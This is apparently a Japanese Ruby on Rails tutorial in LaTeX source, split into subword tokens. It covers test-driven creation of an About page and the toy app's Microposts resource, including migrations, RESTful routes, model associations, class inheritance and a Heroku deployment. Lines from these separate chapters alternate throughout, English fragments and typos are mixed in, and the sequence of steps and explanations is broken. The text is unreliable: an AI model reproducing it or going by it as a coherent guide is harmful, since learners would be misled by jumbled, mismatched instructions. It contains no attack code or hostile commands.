▁\ ref { sec : custom _ static _ pages } で サンプル アプリ の Home ページ と Help ページ を作成して 中 身 も 書き 加 え たので 、 今度は About ページを 同様 に追加します 。
▁create ▁app / assets / javascripts / microposts . js . coffee
▁ 何らかの 変更 を行う 際に は 、 常に 「\ emph { 自動 化 テスト }」 を作成して 、 機能 が正しく 実装 された ことを確認する 習慣 を ぜ ひ 身 に 付け ましょう 。
▁create ▁app / assets / stylesheets / microposts . css . s css
▁ アプリケーションを 開発 し ながら \ emph { テストスイート } を み っ ち り 作成 しておけば 、 い ざ という とき の セ ー フ テ ィ ネ ッ ト にも なり 、 それ 自体 が アプリケーションの ソースコード の 「 実行 可能な ドキュメント 」 にも なります 。
▁ テスト を作成する ということ は 、 その 分 コードを 余 分 に 書くこと になります が 、 正しく 行 えば 、 む し ろ テスト がない とき よりも 確 実 に 開発 速 度 が \ emph { アップ } します 。 テストが 揃 っ ていれば 、 バグ を 追 う ために 余 分 な 時間 を 使 わ ずに 済 む ためです 。
▁id ent ical ▁app / assets / stylesheets / scaffold s . css . s css
▁ そ ん な ふ う に うまく い く とは 信 じ られ ない 人 も いる かもしれませんが 、 一度 でも テスト 作成 が 上 達 すれば 間 違 い なく この とおり になります 。 だ から こ そ 、 テスト 作成 の 習慣 を できる だけ 早 い う ち に 身 に つ け ること が 重要な のです 。
▁( Spring に 関連 した エラーが発生し たら 、 同じ コマンド を もう一度 実行 してみてください )。
▁ テストが 重要 である という 点 では Rails 開発者 の 意 見 は ほぼ 一 致 しています が 、 細 か い 点 では 異 論 が生じ ている の も 確 か です 。
▁ 新しい データモデル で データベース を更新する には 、\ ref { sec : demo _ users _ resource } のとき と同様に マイグレーション を実行します 。
▁ 結 局 テストは い つ 行 えば よい のか
▁= = ▁ Create Microposts : ▁ m i gra t ing ▁= = ========= ========= =========
▁それでは い つ 、 どんな ふ う に テストを 行 えば よい の でしょう か 。 この 点 を理解する ために 、 テスト を行う \ emph { 目的 } を もう一度 確認 してみましょう 。 著者 は 、 テスト には 以下の 3 つの メ リ ッ ト がある と 考え ます 。
▁-- ▁create _ table (: microposts )
▁ テストが 揃 っ ていれば 、 機能 停 止 に 陥 る ような \ emph { 回 帰 バグ } ▁( re g r ess ion : ▁ 以前の バグ が 再 発 したり 機能 追加 / 変更 の 副 作 用 が生じ たり すること 、 先 祖 返 り とも 言 う ) ▁ を 防止 できる 。
▁-> ▁ 0.0 0 23 s
▁ テストが 揃 っ ていれば 、 コードを 安全 に \ emph { リファクタリング } ▁( 機能を 変更 せずに コードを 改 善 すること ) ▁ できる 。
▁= = ▁ Create Microposts : ▁ migrate d ▁( 0.0 0 2 6 s ) ▁= = = = ========= =========
▁ テストコード は 、 アプリケーション コード から 見 れば \ emph { クライアント } として 動作する ので 、 アプリケーションの 設計 や システム の 他の 部分 と の インターフェイス を 決 め る ときに も 役 に 立 つ 。
▁これで Microposts を作成する 準備 が できました 。 作成 方法は \ ref { sec : a _ user _ to ur } と同じ です 。
▁上の 3 つの メ リ ッ ト は 、 テストを 先に 書 か なくても \ emph { 得 ることができます } が 、 それ でも テスト駆動開発 ▁( T D D ) ▁という 手法 を い つ でも 使えるように しておけば 、 間 違 い なく 多くの 場 面 で 役 に 立 ち ます 。
▁置き換えた結果を リスト \ ref { code : demo _ microposts _ resource } に示します 。
▁ テスト の 手法 や タ イ ミ ング は 、 ある 意味 テストを どの ぐらい す ら す ら 書 け る か で 決 ま ると 言 って よいでしょう 。 たい て い の 開発者 は 、 テストを書く の に 慣 れ て く ると テストを 先に 書く ようになります 。
▁ scaffold で 生成 した 実際の コード には リスト \ ref { code : demo _ microposts _ resource } よりも 多くの 改 行 が追加され ている ことがあります 。
▁その 他にも 、 アプリケーションの コード と 比 べ て テストが どの ぐらい 書き にくい か 、 必要な 機能を どの ぐらい 正 確 に 把 握 している か 、 その 機能 が 将来 廃 止 される 可能性 が どの ぐらい ある か によって も 異 な って く る でしょう 。
▁Ruby では 単なる 改 行 は 無視 される ので 、 問題 ありません 。
▁ こう い う とき のために 、「 テスト 駆 動 」 に するか 「 一 括 テスト 」 に するか を 決 め る 目 安 となる ガイド ラ イン がある と 便利です 。
▁Rails ルート で使用する Microposts リソース 用の ルール
▁ 著者 の 経験 を元に 、 以下のように まとめ て み ました 。
▁ アプリケーションの コード よりも 明 ら か に テストコード の 方が 短 く シ ン プ ル になる ▁( = 簡単に 書 け る ) ▁ のであれば 、 テストを 先に 書 け るように な ること を 目 指 す 。
▁ / microposts
▁ 期 待 している 動作 が まだ 固 まり き っ ていない のであれば 、 先に アプリケーションの コードを 書き 上 げ 、 続いて 期 待 する 動作 を テストコード で 記述 すること を 目 指 す 。
▁ すべての マイクロポスト を表示する ページ
▁ セキュリティ が 最 重要 課題 であれば 、 セキュリティ モデル で エラーが発生し た場合 のテスト を 最初に 書く べ き 。
▁ / microposts /1
▁ バグ を見つけ たら 、 その バグ を 再 現 する テストを 真 っ 先に 書き 、 回 帰 バグ を防ぐ 体 制 を 整 え て から アプリケーションの コードの 修正 に 取り か か る 。
▁id = \ ko de {1} の マイクロポスト を表示する ページ
▁ 将来 変更 の 可能性 が 少し でも ある コード ▁( HTML 構造 の 細 部 など ) ▁ があれば 必ず テストを書く 。
▁ / microposts / new
▁ マイクロポストを 新規作成 する ページ
▁ リファクタリング の 前に は 必ず テストを 書き 、 エラー を 起 こ し そう な コード や 、 特に 止 ま っ てしまい そう な コードを 集 中 的に テスト する 。
▁上の ガイド ラ イン に従う 場合 、 現 実 には 最初に コントローラ や モデルの テストを 書き 、 続いて 統合テスト ▁( モデル / ビュー / コントローラに また が る 機能 テスト ) ▁ を 書く 、 という ことになります 。
▁ マイクロポストを 新規作成 する アクション
▁また 、 不 安 定 な 要素 が 特に 見 当 たら ない アプリケーション や 、 ( 主 に ビュー が ) ▁ 頻繁に 改 定 される 可能性 の 高 い アプリケーションの コードを 書く ときに は 、 思い 切 って テスト を省略 してしまう ことも ない わけではありません 。
▁ / microposts /1/ edit
▁ 本書 における 主要な テストは 、\ emph { コントローラ テスト } ▁( この節 より ) 、\ emph { モデル テスト } ▁( 第 \ ref { cha : modeling _ users } 章 より ) 、\ emph { 統合テスト } ▁( 第 \ ref { cha : sign _ up } 章 より ) ▁ の 3 つ です 。
▁id = \ ko de {1} の マイクロポストを 編集 する ページ
▁ 統合テスト では 、 ユーザーが Web ブラウザで アプリケーション と やりとり する 操作 を シ ミ ュ レ ート できる ので 特に 強 力 です 。
▁id = \ ko de {1} の マイクロポスト を更新する アクション
▁ 統合テスト は 最終的に テスティング における 最も 主要な 武 器 となります が 、 まず は 取 っ 付き やすい コントローラ テスト から 始 め る ことにしましょう 。
▁< n >< n > ▁\ subsection { 最初の テスト } ▁% ▁( fold )< n > ▁\ label { sec : our _ first _ test }< n >< n >
▁それでは サンプルアプリケーションの About ページ の作成 に 取り か か ります 。
▁id \ ko de {1} の マイクロポスト を削除する
▁続いて その テスト を実行して 「 失敗 」 する ことを確認 し 、 実際の アプリケーション コードを 書き ます 。
▁ Microposts リソース が提供する リスト \ ref { code : demo _ microposts _ resource } の RESTful ルート
▁ 初めて 書く テストが い き なり 「 テスト 先 行 」 という のは 、 Ruby ▁on ▁Rails の 知 識 が ある程度 以上 必要な ため 、 少々 敷居 が 高 い 面 もあります 。
▁ Microposts コントローラ 自体 の 構造 を リスト \ ref { code : demo _ microposts _ controller } に示します 。
▁ 今 の 段 階 で テストを 書 か せ よう と すると 、 尻 込 み してしまう 人 も いる かもしれません 。
▁ これはリスト \ ref { code : demo _ users _ controller } で使用されていま した 。
▁しかし ご 心 配 なく 。 面倒 な 部分 は 既に Rails が 全 部 面倒 を見 て く れ ています 。 \ ko de { rails ▁ generate ▁ controller } ▁( リスト \ ref { code : g en er at ing _ pages }) ▁ を実行し た 時点 で テスト ファイルが ち ゃ ん と 作成 されている ので 、 それ を 利用 しましょう 。
▁これは 、 REST アーキテクチャ が 2 つの リソース に 同じ ように 反 映 されている ことを 示 しています 。
▁ 生成された テスト を見てみましょう ▁( リスト \ ref { code : default _ controller _ test })。
▁ Microposts コントローラの 骨 格
▁ StaticPages コントローラの デフォルトの テスト
▁ 現時点では 、 上の リスト \ ref { code : default _ controller _ test } の 文法 を い き なり 理解 する必要はありません 。 今 は 「 この ファイル には テストが 2 つ 書かれてい る 」 ことを 認 識 して いた だけ れば 十分 です 。 その 2 つの テストは 、 リスト \ ref { code : g en er at ing _ pages } で 生成 した コントローラの 2 つの アクション である Home と Help に 対応 して 生成された ものです 。
▁ それぞれの テストでは 、 アクション を get して 正常に 動作する ことを確認します 。 この 確認 は 「\ emph { アサーション } 」( assert ion : ▁ 主 張 、 断 言 ) ▁ と呼ばれる 手法 で 行います 。
▁その 次の 「 response \ ko de { : success }」 は 、 実際には HTTP ▁ の \ href { http :// en . w ikipedia . org / wiki / L ist _ of _ HTTP _ status _ code s } { ステータス コード } ▁( ここでは \ href { http :// en . w ikipedia . org / wiki / L ist _ of _ HTTP _ status _ code s # 2 x x _ S u c c ess } { 200 ▁ O K }) ▁ を表し ます 。
▁つまり 、 以下のような テストは
▁ テスティング サ イ ク ル の最初の 一 回 し に 取り か か る 前に 、 まず は 現在の テストスイート を そのまま 実行 して 、 問題 なく パス する ことを確認 しておきます 。
▁\ ref { sec : demo _ users _ resource } でも 説明したように 、 システム 環境 によって は \ ko de { bundle ▁exec } が 追加 不要な こともあります 。 クラウド IDE ▁(\ ref { sec : development _ environment }) ▁ も 追加 不要な システム の ひとつ です 。 しかし ここでは 省略 せずに コマンド を き じ ゅ つ しています 。
▁ 著者 の場合 、 原 則 として \ ko de { bundle ▁exec } は 追加 せずに 実行 し 、 うまく い か ない とき だけ \ ko de { bundle ▁exec } を追加して 様 子 を見 る 、 ということ を よく 行 っています 。
▁$ ▁bundle ▁exec ▁rake ▁test < n > 2 ▁ tests , ▁2 ▁ assert ions , ▁0 ▁ failure s , ▁0 ▁ errors , ▁0 ▁ skip s
▁ テストスイート は 期待どおり パス ( \ passing ) ▁ します
▁ ところで 、 テスト の 実行 には ある程度 時間 が か か ります 。 これ には 2 つの 要 因 が 絡 んで います : ▁ (1) ▁\ emph { Spring ▁ server } を 起動 して Rails 環境 を 事 前 読み込み するのに 時間 が か か る 。 ただし これは 最初の 1 回 だけです 。 (2) ▁Ruby そのもの の 起動 に 時間 が か か る
▁( 2 番目の 要 因 については 、\ ref { sec : guard } で 紹 介 する Guard を 導入 することで 改 善 できます )。
▁ 多くの テスト ツール では 、 テスト の 失敗 を 「 レ ッ ド 」 、 成功 した とき を 「 グ リ ー ン 」 で 表 します 。 ここ から 、 この サ イ ク ル を 「 レ ッ ド ・ グ リ ー ン ・ リファクタリング 」 と 呼 ぶ こともあります 。
▁\ href { http :// localhost :3000/ microposts / new }{/ microposts / new } ページを ブラウザで 開 き 、 新しいマイクロポスト の 情報を 入力 して マイクロポストを いくつか 作成 してみましょう ▁( 図 \ ref { fig : demo _ new _ micropost })。
▁\ ko de { rake ▁test } はデフォルトで 、 テスト の 失敗 を 赤 色 で 表示 します が 、 テストが パス しても 緑色 で 表示 しません 。
▁ 色 も ち ゃ ん と 表示 したい場合は \ ref { sec : mini test _ re port er s } を ご 覧 ください 。
▁ 新しいマイクロポスト の作成 ページ ▁(\ href { http :// localhost :3000/ microposts / new }{/ microposts / new })
▁ サ イ ク ル の 記 念 すべき 第 一 歩 は About ページ 用の 失敗する テストを書く ことです 。
▁ここでは ひ と まず マイクロポストを 1 つ か 2 つ 作成 し 、 少なくとも 片 方 の \ ko de { user \_ id } が \ ko de {1} になる ように して 、\ ref { sec : a _ user _ to ur } で作成した 最初の ユーザーの id と同じ に します 。
▁リスト \ ref { code : default _ controller _ test } を 参 考 に すれば 、 正しい テストコード を 何 と なく 想 像 できる と思います 。 正しい テスト コードをリスト \ ref { code : about _ test } に示します 。
▁ 結果 は 図 \ ref { fig : demo _ micropost _ index } の よう になるはずです 。
▁ About ページ のテスト
▁ マイクロポストの index ページ ▁(\ href { http :// localhost :3000/ microposts }{/ microposts })
▁\ failing ▁\ \ ▁\ file path { test / controllers / static \_ pages \_ controller \_ test . rb } }< n > %= ▁ lang : ruby , ▁ options : ▁" h l _ line s " : ▁[ 15 , ▁ 16 , ▁ 17 , ▁ 18 ] < n >\ begin { code }< n > require ▁' test _ helper ' < n >< n > class ▁ StaticPages Controller Test ▁< ▁ ActionController :: Test C as e < n >< n > ▁test ▁" sh o ul d ▁get ▁ home " ▁do < n > ▁get ▁: home < n > ▁ assert _ response ▁: success
▁ マイクロポストの \ emph { マ イ ク ロ } という 名前 に ふ さ わ しく 、 何らかの 方法で 文字 数 制限 を与えて みましょう 。
▁ マイクロポストの 最 大文字 数 を 14 0 文字 に 制限 する 。
▁リスト \ ref { code : about _ test } の ハ イ ラ イ ト 行 を見ると 、 他の Home ページ 用 テスト や Help ページ 用 テスト と ほとんど 同じ である ことがわかります 。 違 い は 「 home 」 や 「 help 」 の 部分 が 「 about 」 に 変 わ っている 点 だけです 。
▁リスト \ ref { code : demo _ length _ validation } のコードは 、 これ で 本当に 動作する のか と 思える かもしれませんが 、 ち ゃ ん と 動作します ▁( 検証 機能 については \ ref { sec : user _ validations } で さらに 詳 しく 説明します )。 14 1 文字 以上 の 新 規 マイクロポストを 投 稿 して み れば わかり ます 。
▁ テスト を実行すると 、 期待どおり 失敗 します 。
▁ 図 \ ref { fig : micropost _ length _ error } に示した とおり 、 マイクロポスト の内容 が 長 すぎる という \ emph { エラーメッセージ } が Rails によって 表示 されます
▁$ ▁bundle ▁exec ▁rake ▁test < n > 3 ▁ tests , ▁2 ▁ assert ions , ▁0 ▁ failure s , ▁1 ▁ errors , ▁0 ▁ skip s
▁( エラーメッセージ の詳細については \ ref { sec : signup _ error _ messages } で説明します )。
▁ マイクロポストの 作成 に 失敗した場合 の エラーメッセージ
▁ 異なる データモデル 同士 の \ emph { 関連付け } は 、 Rails の 強力な 機能 です 。
▁ここでは 、 1 人のユーザー に 対 し 複数の マイクロポスト がある と しましょう 。
▁ 失敗した テスト の エラーメッセージ を もっと 詳 しく 見 て い き ましょう
▁User モデルと Micropost モデル を それぞれ リスト \ ref { code : demo _ user _ has _ many _ microposts } と リスト \ ref { code : demo _ micropost _ belongs _ to _ user } のように 更新 することで この 関連付けを 表現 できます 。
▁ システム によって は 、 ソースコード の エラー パス を 追 跡 する 「 ス タ ッ ク ト レ ー ス 」 または 「 バ ッ ク ト レ ー ス 」 と呼ばれる メッセージ が 大 量 に 表示される ことがあります 。 この場合 、 かなり 上 に ス ク ロー ル する 必要がある かもしれません 。
▁1 人のユーザー に 複数の マイクロポスト がある 。
▁ バ ッ ク ト レ ー ス 出力 を 絞 り 込 んで 不要な 行 が表示され ないように したい場合は 、\ ref { sec : b ack tr a ce _ s il en c er } を ご 覧 ください 。
▁1 つの マイクロポスト は 1 人のユーザー に のみ 属 する 。
▁$ ▁bundle ▁exec ▁rake ▁test < n > ActionController :: U r l G en er ation Error : < n > No ▁ route ▁ match es ▁ { : action => " about ", ▁: controller => " static _ pages "}
▁この 関連付けを 図 で 表 した もの が 図 \ ref { fig : micropost _ user _ association } です 。
▁この エラーメッセージ に よ れば 、「 指定された アクション / コントローラの 組み合わせ に 一致する ルーティング が 見 当 たら ない 」 と あります 。 つまり ルーティング ファイル を修正する 必要がある ということです 。
▁\ ko de { microposts } テーブル には \ ko de { user \_ id } カラム を作成して あった ので 、 それ によって Rails と Active ▁Record が マイクロポスト と ユーザーを 関連付け る ことができる ようになっています 。
▁リスト \ ref { code : pages _ routes } のとき と 同じ要領で 変更を 行った 結果を リスト \ ref { code : about _ route } に示します 。
▁ The ▁ association ▁be t w e en ▁ microposts ▁and ▁ users .
▁\ ko de { about } 用の ルート を追加する
▁ 第 \ ref { cha : user _ microposts } ▁ 章 と 第 \ ref { cha : following _ users } 章では 、 関連付けられた ユーザー と マイクロポストを 同時に 表示 し 、 Twitter のような マイクロポストの フィード を作成する 予定です 。
▁ここでは 、 Rails の \ emph { console } を使用して 、 ユーザー と マイクロポストの 関連付け を確認する に と ど め ます 。 Rails の console は 、 Rails アプリケーションを 対 話 的に 操作 する ことができる 便利な ツール です 。
▁$ ▁bundle ▁exec ▁rake ▁test < n > A b s tr a ct Controller :: Action No t F ound : < n > The ▁ action ▁' about ' ▁ co ul d ▁ not ▁be ▁f ound ▁for ▁ StaticPages Controller
▁We ▁ first ▁invo ke ▁the ▁console ▁with ▁\ ko de { rails ▁console } ▁ at ▁the ▁ command ▁ line , ▁and ▁the n ▁ re t ri e ve ▁the ▁ first ▁ user ▁ from ▁the ▁ database ▁ us ing ▁\ ko de { User . first } ▁( put t ing ▁the ▁ re s ul t s ▁in ▁the ▁ variable ▁\ ko de { first \_ user })
▁この エラーメッセージ から 、「 StaticPages コントローラに \ ko de { about } アクション がない 」 という ことがわかります 。 リスト \ ref { code : static _ pages _ controller } の \ ko de { home } や \ ko de { help } と同じ ように about アクション を追加します ▁( リスト \ ref { code : adding _ the _ about _ page })。
▁\ ko de { about } アクション が追加され た StaticPages コントローラ
▁=> ▁[ # < Micropost ▁id : ▁1, ▁ content : ▁" F ir st ▁ micropost ! ", ▁ user _ id : ▁1, ▁< n > created _ at : ▁" 20 11 - 11 - 0 3 ▁0 2 : 3 7 : 3 7 ", ▁ updated _ at : ▁" 20 11 - 11 - 0 3 ▁0 2 : 3 7 : 3 7 "> ,
▁ micropost . user
▁$ ▁bundle ▁exec ▁rake ▁test < n > ActionView :: M is s ing T e m p la te : ▁ M is s ing ▁ template ▁ static _ pages / about
▁( 最後の 行 のように \ ko de { ex it } を実行すると rails ▁console を 終 了 できます 。
▁今度は テンプレート がない よう です 。 Rails では テンプレート と い えば す な わ ち 「 ビュー 」 の ことです 。
▁ 多くの システム では 、 Ctrl - d キー を 押 して 終 了 することもできます 。 )
▁ ファイル の作成 方法は システム の設定 によって さ ま ざ ま ですが 、 たい て い の テキストエディタ では 、 ディレクトリ を Ctrl + クリック すれば コンテキスト メニュー に ▁[ New ▁ File ] ▁ や ▁[ ファイルを 作成 ] ▁ などの メニュー が表示されます 。
▁ あるいは エディタ の [ File ] メニュー で ファイル を作成して 、 この ディレクトリ に保存 しても 構 いません 。
▁このとき Active ▁Record は 、\ ko de { user \_ id } が \ ko de { first \_ user } の id ▁( ここでは \ ko de {1} ) ▁ と 等 しい マイクロポストを 自動的に 返します 。
▁ 個 人 的に は \ href { http :// en . w ikipedia . org / wiki / To u ch _ ( Unix ) } { Unix の to u ch コマンド } で ファイル を作成する の が かっこ い い と思います 。
▁We ’ ll ▁ learn ▁ m u ch ▁more ▁ about ▁the ▁ association ▁ fa c il it ies ▁in ▁Active ▁Record ▁in ▁C ha p ter ▁\ ref { cha : user _ microposts } ▁and ▁C ha p ter ▁\ ref { cha : following _ users } .
▁\ ko de { to u ch } コマンド は 本 来 ファイル や ディレクトリ の タイムスタンプ だけ を更新する ための コマンド な のですが 、 ファイルが 存在しない 場合には 空 ファイル を作成する という 一 種 の 副 作 用 があります
▁最後に 、 To y アプリケーションで 使用している Rails の コントローラ と モデルの クラス 階層 について 簡単に 解説します 。
▁( クラウド IDE を ご 利用 の場合は 、 to u ch で ファイル 作成 後に \ ref { sec : bundle r } のように ファイル ツ リ ー の 更新 が 必要な 場合 があります )。
▁ この節 を理解する には 、 多 少 なり とも オブジェクト 指 向 プログラミング ▁( O O P ) ▁ の 経験 が必要です 。 オブジェクト 指 向 プログラミング を 学 んだ こと の ない 方は この節 を スキップ しても 構 いません 。
▁ これはリスト \ ref { code : custom _ about _ page } で使用されていま した 。
▁ 特に 、\ emph { クラス } の 概念 ▁(\ ref { sec : ruby _ classes } で 解説します ) ▁ に 慣 れ ていない 方は 、 後 で この節 を もう一度 読み 返す ことを お す す め いた します 。
▁最初に 、 モデルの 継 承 構造 について説明し ます 。
▁ About ページ のコード
▁リスト \ ref { code : demo _ user _ class } と リスト \ ref { code : demo _ micropost _ class } を 比 較 してみる と 、 User モデルと Micropost モデル は いずれ も \ ko de { ActiveRecord :: Base } という クラス を継承し ています ▁( 継 承 関係 は \ ko de { < } 記 号 で 表現 されています )。 この クラス は 、 ActiveRecord が提供する ベース クラス であり 、 クラス 間 の リレーション は 図 \ ref { fig : demo _ model _ inheritance } のようになります 。
▁Ruby ▁on ▁Rails ▁3.2 ▁ チュートリアル
▁ 他 も 同様 です 。
▁< n > ▁This ▁is ▁the ▁ sample ▁ application ▁for ▁the ▁ tutorial .
▁\ ko de { User } クラスにおける継承
▁今度は \ ko de { rake ▁test } の 結果 は ▁\ passing ▁ になるはずです 。
▁\ ko de { Micropost } クラスにおける継承
▁$ ▁bundle ▁exec ▁rake ▁test < n > 3 ▁ tests , ▁3 ▁ assert ions , ▁0 ▁ failure s , ▁0 ▁ errors , ▁0 ▁ skip s
▁User モデルと Micropost モデルの 継 承 階層
▁もちろん 、 実際に ブラウザ を 起動 して 、 テスト が正しく 動 い ている かどうかを 確かめ る こともできます ▁( 図 \ ref { fig : about _ us })。
▁ コントローラの 継 承 構造 は もう少し だけ 複 雑 です 。
▁作成した About ページ ▁(\ href { http :// localhost :3000/ static _ pages / about }{/ static \_ pages / about })
▁リスト \ ref { code : demo _ users _ controller _ class } と リスト \ ref { code : demo _ microposts _ controller _ class } を 比 較 してみる と 、 Users コントローラ と Microposts コントローラ は いずれ も Application Controller を継承し ています 。
▁ テストが ▁\ passing ▁ になった ので 、 安 心 して コードを リファクタリング できるようになりました 。
▁リスト \ ref { code : toy _ application _ controller _ class } を見ると 、\ ko de { Application Controller } 自身 は \ ko de { ActionController :: Base } を継承し ています 。 これは Rails の Action ▁P ack という ライブラリ が 提供し ている 、 コントローラ 用の ベース クラス です 。
▁ アプリケーションの 開発 が 進 む と 、 コードの ど こ から とも なく 「 腐 敗 臭 」 が 漂 い 始 め ます 。 コード や 記 法 の 統 一 が 崩 れ て 読み づ ら くなる 、 クラス や メソッドが 何 百 行 にも 膨 れ 上 が って 読 む 気 を 削 が れる 、 な ぜ このコード が ここ にある のか 最 早 誰 も その 理由 を 思い 出 せ な くなる 、 同じ コードが あ ち こ ち に コ ピ ペ されて 少し ず つ 書き 換 え られ 手 に 負 え な くなる 、 など です 。
▁これらの クラス 同士 の関係 を 図 \ ref { fig : demo _ controller _ inheritance } に示します 。
▁ コンピュータ に して み れば どんな に 汚 ら しい コード で あ ろ う と 、 そこ にある が ま ま に 実行 する だけです が 、 人 間 は そう い う わ け には い き ません 。 こ ま め に リファクタリング を 繰り返し て コードを 常に す み ず み まで 美 しく コ ン パ ク ト に 保 ち 、 他の 開発者 や 未 来 の 自分の 開発 意 欲 を 阻 喪 すること の ないように し なければなりません 。
▁\ ko de { Users Controller } クラスにおける継承
▁この サンプル アプリ は 生 まれ た て なので 、 今 の ところ リファクタリング の 必要な 箇所 は ほぼ ど こ にも 見 当 たり ません 。 しかし 「 一 匹 い れば 30 匹 いる と 思 え 」 、\ href { https :// en . w ikipedia . org / wiki / Co de _ s me ll } { コードの 腐 敗 臭 } は どんな 小さな 隙 間 から も 忍 び 寄 って きます 。 こ m リファクタリング の 習慣 を できる だけ 早 い う ち に 身 に つ け るために も 、 少々 無 理 や り に \ ref { sec : layouts _ and _ e m b ed de d _ ruby } から 始 め る ことにします 。
▁< n >< n > ▁% ▁ sub subsection ▁ re factor ▁( end )< n >< n > ▁% ▁subsection ▁ our _ first _ test < n >< n > ▁% ▁ section ▁ getting _ started _ with _ testing ▁( end )< n >< n >< n > ▁\ section { 少し だけ 動的な ページ } ▁% ▁( fold )< n > ▁\ label { sec : s li g h t ly _ d y n am i c _ pages }< n >< n >
▁\ ko de { Microposts Controller } クラスにおける継承
▁ 静的なページ の アクション や ビュー を いくつか 作成 できた ので 、 今度は それ を \ emph { ほ ん の 少し だけ } 動的 に してみましょう 。 ページ の内容 に応じて 、 ページの タイトル を 自 ら 書き 換 え て 表示する ようにします 。
▁ タイトル を 自動 で 変え る ぐらい の ことが \ emph { 真 の } 動的 コンテンツ と 呼 べ る かどうか は 議 論 の 余 地 がある と思います が 、 いずれ に し ろ この ページ は 、 第 \ ref { cha : sign _ up } 章 で 紹 介 する 本 格 的な 動的 コンテンツ の基礎 となります 。
▁\ ko de { Application Controller } クラスにおける継承
▁ The ▁ inheritance ▁ h i er ar ch y ▁for ▁the ▁ Users ▁and ▁ Microposts ▁ controllers .
▁ モデルの 継 承 関係 と同様に 、 Users コントローラ も Microposts コントローラ も 最終的に は \ ko de { ActionController :: Base } を継承し ており 、 モデル オブジェクトの 操作 、 イン バ ウ ンド HTTP ▁ request の フィルタ 、 ビュー を HTML として 出力 する などの 多 彩 な 機能を 実行 できる ようになっています 。 ▁S in ce ▁ all ▁Rails ▁ controllers ▁in her it ▁ from ▁\ ko de { Application Controller } , ▁ r ul es ▁def in ed ▁in ▁the ▁ Application ▁ controller ▁ auto ma tic all y ▁app ly ▁to ▁ e ver y ▁ action ▁in ▁the ▁ application .
▁たとえば \ ref { sec : remember _ me } では 、 ログイン と ログアウト 用の ヘルパーメソッド を サンプルアプリケーションの すべての コントローラ で 利用できる ようにしています 。
▁ Microposts リソース の 説明 が 終わり ました ので 、 ここで リポジトリ を Bitbucket に 登録 しましょう 。
▁ 通常 、 Git の コミット は なるべく こ ま め に 行う ように し 、 更新 を あ まり ため ないこと が 望 ま しい のですが 、 この章 の 締 め く く り として サイズ の 大きな コミット を 1 度 だけ 行う ぐらい であれば 問題 ありません 。
▁ この時点で 、 To y アプリケーションを \ ref { sec : de p lo y ing } のように Heroku に 展開 しても か ま いません 。
▁( 上の コマンド 操作 では 、\ ref { sec : p la n n ing _ the _ application } の Heroku アプリ を作成 済み であること が 前 提 です 。
▁ここで の 目 標 は 、 Home ページ 、 Help ページ 、 About ページを それぞれ 編集 し 、 最終的に ページ ごとに 異なる タイトル を表示する ことです 。
▁ アプリ を作成し ていない のであれば 、 先に \ ko de { heroku ▁create }、\ ko de { git ▁ push ▁ heroku ▁ master } を実行して から 上の コマンド 操作 を実行して ください 。 )
▁ここでは ビュー の \ ko de { < title > } タグ の内容 を変更 します 。
▁ アプリケーションの データベース が 動作する ように するには 、 以下 を実行して 本番 データベースの マイグレーション を行う 必要 もあります 。
▁ 多くの ブラウザで は 、 title タグ の内容 を ブラウザ ウ ィ ンド ウ の 上 部 に ウ ィ ンド ウ タイトル として 表示 します 。 title タグ は 、 い わ ゆ る S E O ▁( search ▁ engine ▁ o p t im i z ation : ▁ 検索 エンジン 最適化 ) ▁ において も 重要な 役 割 を 果 た します 。
▁この コマンド を実行すると 、 先ほど 定義 した ユーザー と マイクロポストの データモデル を使って 、 Heroku 上の データベース が 更新 されます 。
▁ 本 節 の 終わり まで に 、 3 つの 静的ページ の タイトル を 「 < ページ 名 > ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁A p p 」 という 形式 に変更 します 。 「 < ページ 名 > 」 の 部分 が ページ に応じて 変 わ ります ▁( 表 \ ref { table : static _ pages })。
▁ マイグレーション が 完了 すれば 、 To y アプリ を 実際の PostgreSQL データベース を バ ッ ク エ ンド に 配置 した 本番環境で 利用できる よう になっている はずです ( 図 \ ref { fig : toy _ app _ production })。
▁ 前 述 の \ ko de { rails ▁ new } コマンド ▁( リスト \ ref { code : rails _ new _ sample _ app }) ▁ を実行すると 、 レイアウト も デフォルトで 作成されます 。 ここでは 学習 の ため 、 一時 的に 以下のように ファイル名 を変更 します 。
▁ To y アプリ を 本番環境で 実行 する
▁ 普通 は 、 実際の アプリケーション 開発 時に 上 のような 操作 を行う ことはありません 。 ここでは 、 レイアウト ファイルの 役 割 を より わかりやすく 説明 するために 、 最初に レイアウト ファイルを 無効 に しています 。
▁ 非常に 簡単 では あります が 、 つ い に Rails アプリケーションを 最 後 まで 完成 させ ました 。
▁ 基本 タイトル
▁ この章 で作成した To y アプリケーション には 良い ところ もあります が 、 さまざまな 弱 点 もあります 。
▁ 追加 タイトル
▁Rails 全体 を 高度な レベル で 概 観 できた
▁ MVC モデル を 紹 介 できた
▁ REST アーキテクチャ に 初めて 触 れ た
▁ データモデル の作成 を 初めて 行った
▁ データベース を 背 後に 持つ Web アプリケーションを 本番環境で 動か した
▁ サンプルアプリケーションの ▁( ほぼ ) ▁ 静的なページ 。
▁ レイアウト も スタイル も 設定 されていない
▁\ label { table : static _ pages } }< n >\ end { table }< n >< n > ▁\ subsection { タイトル をテストする ▁( Re d ) } ▁% ▁( fold )< n > ▁\ label { sec : testing _ title s }< n >< n >
▁ ページ タイトル を追加する ために 、 典 型 的な Web ページの 構造 を 今 一度 お さ ら い しておきましょう ▁( リスト \ ref { code : html _ structure })。
▁“ Home ” ▁ や ▁“ About ” ▁ のような 定 番 の 静的なページ がない
▁ ユーザーが パスワードを 設定 できない
▁Web ページの 典 型 的な HTML 構造
▁ ユーザーが 画像 を 置 け ない
▁ ログイン の しく み がない
▁ セキュリティ のための しく み が まったく ない
▁ユーザー と マイクロポストの 自動 関連付け が行われ ていない
▁ Twitter のような 「 フォロワー ▁( following ) 機能 」 や 「 フォロー 中 ▁( followed ) 機能 」 がない
▁ マイクロポストを フィード できない
▁ ま とも な テスト がない
▁ HTML の 仕 様 は 時 と とも に 変わる 可能性 がある と 思 っ ておく 方が よいでしょう 。 今後 も ブラウザで なるべく 正しく ページを 表示 できるように 、 doc type を 明示的に 宣言 しています 。
▁ 理解 が 困 難
▁\ ko de { p } ▁( p ar a gra ph ) ▁ タグ を使って 、 ▁“ Hello , ▁ world ! ” ▁ と 表示する ようにしています 。
▁( HTML では スペース や タブ は 無視 される ので 、 インデント は あって も なくても 大 丈 夫 ですが 、 インデント がある 方が HTML の データ 構造 を 理解 し や す く なります )。
